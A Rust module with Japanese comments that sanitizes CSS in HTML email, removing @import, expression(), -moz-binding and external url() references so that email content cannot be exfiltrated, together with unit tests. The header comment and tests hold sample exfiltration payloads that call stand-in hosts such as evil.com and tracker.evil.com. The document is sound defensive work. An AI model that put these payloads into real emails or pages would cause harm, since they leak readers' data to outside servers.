//! CSS 外部リソース参照の除去 (exfiltration 防止)。
//!
//! # 脅威: EchoLeak (CVE-2025-32711) / CSS Blind Exfiltration
//!
//! HTML メール中の CSS が `@import url("https://evil.com/?v=...")` や
//! `background-image: url(https://attacker.com/track?data=...)` を含む場合、
//! メール表示時に自動 HTTP リクエストが発生し、機密情報を外部送信できる。
//!
//! Sequential Import Chaining (SIC) では `@import` を連鎖させることで
//! JavaScript なしにメールコンテンツをバイト単位で抽出できる。
//!
//! # 防御
//!
//! - `@import` ルールを全削除
//! - `url(http://...)` / `url(https://...)` を `url(about:blank)` に置換
//! - `expression(...)` (IE legacy) を削除
//! - `-moz-binding:` / `behavior:` プロパティを削除
//!
//! # 設計方針
//!
//! 完全な CSS パーサーは使用せず、行単位 + 文字列検索で高速処理する。
//! 誤検知よりも見逃しを減らす (メールの安全性が最優先)。

/// CSS サニタイズ結果。
#[derive(Debug, PartialEq)]
pub struct CssSanitizeResult {
    /// サニタイズ後の CSS テキスト。
    pub sanitized: String,
    /// 除去または無効化されたルール数。
    pub removed_count: usize,
}

/// CSS テキストから外部リソース参照を除去する。
///
/// `style` 属性値または `<style>` ブロック内のテキストに適用する。
///
/// # 処理順序
///
/// 1. CSS ブロックコメント (`/* ... */`) を除去
/// 2. `@import` を含む行を除去 (コメント後の mid-line `@import` も対象)
/// 3. `expression()` / `-moz-binding` / `behavior:` を含む行を除去
/// 4. `url(http://...)` を `url(about:blank)` に置換
#[must_use]
pub fn sanitize_css(css: &str) -> CssSanitizeResult {
    let mut removed_count = 0;

    // CSS ブロックコメントを除去 (/* ... */ の単純な除去)
    let css = strip_css_comments(css);

    let result: Vec<&str> = css.lines()
        .filter(|line| {
            let lower = line.to_ascii_lowercase();
            // @import ルールを完全に除去 (mid-line も含む)
            if lower.contains("@import") {
                removed_count += 1;
                return false;
            }
            // expression() (IE) を含む行を除去
            if lower.contains("expression(") {
                removed_count += 1;
                return false;
            }
            // -moz-binding / behavior: プロパティを除去
            if lower.contains("-moz-binding") || lower.trim_start().starts_with("behavior") {
                removed_count += 1;
                return false;
            }
            true
        })
        .collect();

    // url(http://...) および url(https://...) を url(about:blank) に置換
    let joined = result.join("\n");
    let (sanitized, url_removed) = rewrite_external_urls(&joined);
    removed_count += url_removed;

    CssSanitizeResult { sanitized, removed_count }
}

/// CSS ブロックコメント (`/* ... */`) を除去する。
///
/// 複数行コメントにも対応。ネストしたコメントは CSS 仕様では許可されない。
fn strip_css_comments(css: &str) -> String {
    let mut result = String::with_capacity(css.len());
    let mut in_comment = false;
    let chars: Vec<char> = css.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        if !in_comment && i + 1 < chars.len() && chars[i] == '/' && chars[i + 1] == '*' {
            in_comment = true;
            i += 2;
        } else if in_comment && i + 1 < chars.len() && chars[i] == '*' && chars[i + 1] == '/' {
            in_comment = false;
            i += 2;
            // コメントを空白に置換 (行構造を保持)
            result.push(' ');
        } else if !in_comment {
            result.push(chars[i]);
            i += 1;
        } else {
            // コメント内の改行は保持 (行番号を維持)
            if chars[i] == '\n' {
                result.push('\n');
            }
            i += 1;
        }
    }
    result
}

/// HTML の `style` 属性からも外部参照を除去する (インライン CSS 用)。
#[must_use]
pub fn sanitize_style_attribute(value: &str) -> (String, bool) {
    let lower = value.to_ascii_lowercase();
    // expression() チェック
    if lower.contains("expression(") || lower.contains("-moz-binding") || lower.contains("behavior") {
        return (String::new(), true);
    }
    let (rewritten, count) = rewrite_external_urls(value);
    (rewritten, count > 0)
}

/// `url(...)` の参照先がネットワークフェッチを起こさない安全な参照か判定する。
///
/// 保持する (安全) のは、インライン/ローカル参照のみ:
/// - `data:` (インラインデータ、ネットワーク不要)
/// - `about:` (`about:blank` 等)
/// - `cid:` (メール埋め込み添付への参照)
/// - `#` で始まるフラグメント参照 (SVG フィルタ等の同一文書内参照)
/// - 空文字列
///
/// これ以外 (http(s)、プロトコル相対 `//host`、`ftp:`/`blob:` 等の任意スキーム、
/// 裸ホスト `evil.com/x` 等) はすべて外部フェッチを起こし得るため中和する。
/// 引数は小文字化・トリム・クォート除去済みの inner を想定。
fn is_safe_css_url_target(inner_lower: &str) -> bool {
    inner_lower.is_empty()
        || inner_lower.starts_with("data:")
        || inner_lower.starts_with("about:")
        || inner_lower.starts_with("cid:")
        || inner_lower.starts_with('#')
}

/// `url(...)` のうち外部フェッチを起こし得るものを `url(about:blank)` に置換する。
///
/// 大文字小文字を無視し、シングル/ダブルクォートあり/なしを全パターン対応。
/// 安全な参照 (`data:`/`about:`/`cid:`/`#`/空) は保持する。
/// 戻り値: (置換後文字列, 置換件数)
fn rewrite_external_urls(css: &str) -> (String, usize) {
    let mut result = String::with_capacity(css.len());
    let mut count = 0;
    let bytes = css.as_bytes();
    let mut i = 0;

    while i < bytes.len() {
        // "url" を大文字小文字無視で探す
        if i + 3 <= bytes.len()
            && bytes[i].eq_ignore_ascii_case(&b'u')
            && bytes[i + 1].eq_ignore_ascii_case(&b'r')
            && bytes[i + 2].eq_ignore_ascii_case(&b'l')
        {
            // "url" に続く '(' を探す (空白可)
            let mut j = i + 3;
            while j < bytes.len() && bytes[j] == b' ' { j += 1; }
            if j < bytes.len() && bytes[j] == b'(' {
                // 括弧内を抽出
                let start = j + 1;
                if let Some(end) = css[start..].find(')') {
                    let inner = css[start..start + end].trim().trim_matches(|c| c == '\'' || c == '"');
                    let inner_lower = inner.to_ascii_lowercase();
                    // 外部フェッチを起こし得る参照はすべて中和する (安全性最優先)。
                    // 以前は http:// / https:// のリテラル prefix のみ判定しており、
                    // プロトコル相対 URL (url(//tracker.evil/pixel)) や ftp: 等の
                    // 別スキーム、裸ホスト (url(evil.com/x)) がすり抜けて
                    // 表示時に自動フェッチされ得た (CSS Blind Exfiltration)。
                    if !is_safe_css_url_target(&inner_lower) {
                        result.push_str("url(about:blank)");
                        i = start + end + 1;
                        count += 1;
                        continue;
                    }
                }
            }
        }
        // 通常文字をそのままコピー
        if let Some(ch) = css[i..].chars().next() {
            result.push(ch);
            i += ch.len_utf8();
        } else {
            i += 1;
        }
    }

    (result, count)
}

// ============================================================================
// テスト
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn import_rule_removed() {
        let css = "@import url('https://evil.com/steal?v=abc');\nbody { color: red; }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("@import"), "@import は除去されるべき");
        assert!(result.sanitized.contains("color: red"), "無害なルールは保持されるべき");
        assert_eq!(result.removed_count, 1);
    }

    #[test]
    fn import_without_quotes_removed() {
        let css = "@import url(https://evil.com/track);";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("@import"));
        assert_eq!(result.removed_count, 1);
    }

    #[test]
    fn background_image_external_url_rewritten() {
        let css = "body { background-image: url(https://tracker.evil.com/pixel); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("tracker.evil.com"), "外部URLは書き換えられるべき");
        assert!(result.sanitized.contains("about:blank"), "about:blank に置換されるべき");
        assert_eq!(result.removed_count, 1);
    }

    #[test]
    fn data_url_preserved() {
        let css = "body { background-image: url(data:image/png;base64,abc123); }";
        let result = sanitize_css(css);
        assert!(result.sanitized.contains("data:image/png"), "data: URL は保持されるべき");
        assert_eq!(result.removed_count, 0);
    }

    #[test]
    fn expression_removed() {
        let css = "body { width: expression(document.body.scrollWidth); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("expression("), "expression() は除去されるべき");
    }

    #[test]
    fn moz_binding_removed() {
        let css = "body { -moz-binding: url('chrome://foo/bar.xml#foo'); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("-moz-binding"), "-moz-binding は除去されるべき");
    }

    #[test]
    fn clean_css_unchanged() {
        let css = "body { color: #333; font-size: 16px; } h1 { font-weight: bold; }";
        let result = sanitize_css(css);
        assert_eq!(result.removed_count, 0);
        assert!(result.sanitized.contains("color: #333"));
    }

    #[test]
    fn http_url_also_rewritten() {
        let css = "div { background: url(http://evil.com/track); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("evil.com"));
        assert!(result.sanitized.contains("about:blank"));
    }

    #[test]
    fn protocol_relative_url_rewritten() {
        // 回帰: プロトコル相対 URL (//host) は http/https prefix に一致しないため
        // 以前は素通りしていた。表示時に https で解決され自動フェッチされる。
        let css = "body { background-image: url(//tracker.evil.com/pixel?d=SECRET); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("tracker.evil.com"),
            "プロトコル相対 URL が中和されていない: {}", result.sanitized);
        assert!(result.sanitized.contains("about:blank"));
        assert_eq!(result.removed_count, 1);
    }

    #[test]
    fn non_http_scheme_url_rewritten() {
        // ftp: 等 http(s) 以外のスキームも外部フェッチを起こし得る
        let css = "div { background: url(ftp://evil.com/x); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("evil.com"),
            "ftp: スキームが中和されていない: {}", result.sanitized);
        assert!(result.sanitized.contains("about:blank"));
    }

    #[test]
    fn bare_host_url_rewritten() {
        // スキームなしの裸ホストも相対解決で外部フェッチになり得る
        let css = "div { background: url(evil.com/track.png); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("evil.com"),
            "裸ホスト URL が中和されていない: {}", result.sanitized);
        assert!(result.sanitized.contains("about:blank"));
    }

    #[test]
    fn cid_and_fragment_urls_preserved() {
        // メール埋め込み添付 (cid:) と同一文書内フラグメント (#) は保持
        let css1 = "body { background: url(cid:logo123); }";
        let r1 = sanitize_css(css1);
        assert!(r1.sanitized.contains("cid:logo123"), "cid: は保持されるべき");
        assert_eq!(r1.removed_count, 0);

        let css2 = "rect { filter: url(#blur); }";
        let r2 = sanitize_css(css2);
        assert!(r2.sanitized.contains("url(#blur)"), "フラグメント参照は保持されるべき");
        assert_eq!(r2.removed_count, 0);
    }

    #[test]
    fn multiple_imports_all_removed() {
        let css = "@import url('https://a.evil.com/');\n@import url('https://b.evil.com/');\np { color: blue; }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("@import"));
        assert_eq!(result.removed_count, 2);
        assert!(result.sanitized.contains("color: blue"));
    }

    #[test]
    fn style_attribute_expression_blocked() {
        let (out, modified) = sanitize_style_attribute("width: expression(alert(1))");
        assert!(modified, "expression() を含む属性は変更されるべき");
        assert!(out.is_empty(), "expression() を含む属性は空になるべき");
    }

    #[test]
    fn style_attribute_clean_preserved() {
        let (out, modified) = sanitize_style_attribute("color: red; font-size: 14px;");
        assert!(!modified, "クリーンな属性は変更しない");
        assert_eq!(out, "color: red; font-size: 14px;");
    }

    #[test]
    fn url_case_insensitive_rewritten() {
        // URL() 大文字
        let css = "div { background: URL(HTTPS://evil.com/img.png); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("evil.com"));
    }

    #[test]
    fn midline_import_after_comment_removed() {
        // コメントの後に @import が来る場合 (コメント除去後に検出される)
        let css = "/* harmless */ @import url('https://evil.com');\nbody { color: red; }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("@import"), "コメント後の @import は除去されるべき");
        assert!(result.sanitized.contains("color: red"), "無害なルールは保持");
    }

    #[test]
    fn import_inside_comment_not_flagged() {
        // コメント内の @import はコメント自体が除去されるので問題なし
        let css = "/* @import url('https://evil.com'); */\nbody { color: blue; }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("evil.com"), "コメント内の URL は除去されるべき");
        assert!(result.sanitized.contains("color: blue"));
    }

    #[test]
    fn multiline_comment_stripped() {
        let css = "body {\n  /* remove\n  this */\n  color: red;\n}";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("remove"), "コメントは除去されるべき");
        assert!(result.sanitized.contains("color: red"));
    }

    #[test]
    fn font_face_external_url_rewritten() {
        // @font-face も外部 URL を書き換え (直接 src: url() を検出)
        let css = "@font-face { font-family: 'Evil'; src: url(https://evil.com/font.woff); }";
        let result = sanitize_css(css);
        assert!(!result.sanitized.contains("evil.com"), "@font-face の外部 URL も書き換え");
        assert!(result.sanitized.contains("about:blank"));
    }
}
